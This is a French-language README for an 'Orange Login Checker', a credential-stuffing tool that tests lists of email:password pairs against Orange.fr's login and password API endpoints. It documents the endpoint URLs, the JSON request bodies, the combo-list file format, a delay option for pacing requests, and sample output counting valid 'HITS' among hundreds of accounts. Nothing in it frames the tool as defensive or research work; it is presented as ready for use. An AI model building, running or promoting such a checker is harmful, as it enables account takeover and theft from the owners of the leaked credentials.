# Orange Login Checker

Testeur de comptes Orange.fr utilisant les API de login officielles.

## Installation

```bash
pip install requests
```

## Utilisation

```bash
python3 checker.py accounts.txt
```

### Options

```bash
# Avec délai personnalisé (défaut: 0.5s)
python3 checker.py accounts.txt --delay 1.0
```

## Format fichier

`accounts.txt` doit être au format:
```
email@orange.fr:password
user@orange.fr:motdepasse
...
```

## APIs utilisées

1. **Login endpoint** : `https://login.orange.fr/api/login`
   ```json
   {"login":"email@orange.fr","loginOrigin":"input"}
   ```

2. **Password endpoint** : `https://login.orange.fr/api/password`
   ```json
   {"password":"motdepasse"}
   ```

## Résultats

- **✓ HIT** : Compte valide
- **✗ INVALID** : Mot de passe incorrect
- **⚠ ERROR** : Erreur réseau/timeout

## Affichage

Le titre du terminal affiche les stats en temps réel:
```
[HITS] : 42 | [INVALID] : 156 | [ERRORS] : 8 | [RESTANTS] : 294
```

## Exemple

```bash
$ python3 checker.py accounts.txt
Orange Checker - 500 comptes

[     1] user1@orange.fr                       | ✓ HIT
[     2] user2@orange.fr                       | ✗ INVALID
[     3] user3@orange.fr                       | ⚠ ERROR
...

✓ HITS: 42
✗ INVALID: 456
⚠ ERRORS: 2
```
